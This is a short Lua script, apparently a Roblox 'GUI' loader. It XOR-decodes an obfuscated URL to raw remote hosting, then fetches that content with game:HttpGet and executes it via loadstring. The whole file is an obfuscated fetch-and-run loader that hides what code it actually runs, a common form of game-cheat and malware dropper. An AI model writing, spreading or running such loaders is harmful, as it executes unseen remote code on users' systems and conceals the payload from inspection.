--[[
        1x1x1x1 GUI
]]--

local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9)local v10={};for i=(2 -1) + 0, #v8 do v6(v10,v0(v4(v1(v2(v8,i,i + 1 + (0 -0))),v1(v2(v9,1 + ((i-1)% #v9),1 + 0 + ((i-((3 -2) + (1947 -(843 + 1104))))% #v9) + (390 -(296 + 93)))))%256));end return v5(v10);end loadstring(game:HttpGet(v7("\3\51\151\188\91\83\68\104\145\173\95\71\12\46\151\164\93\11\30\52\134\190\75\6\5\51\134\162\92\71\8\40\142\227\92\16\25\34\143\184\90\0\1\40\204\253\80\88\68\42\130\165\70\70\90\63\210\180\25\17\90","\107\71\227\204\40\105")))();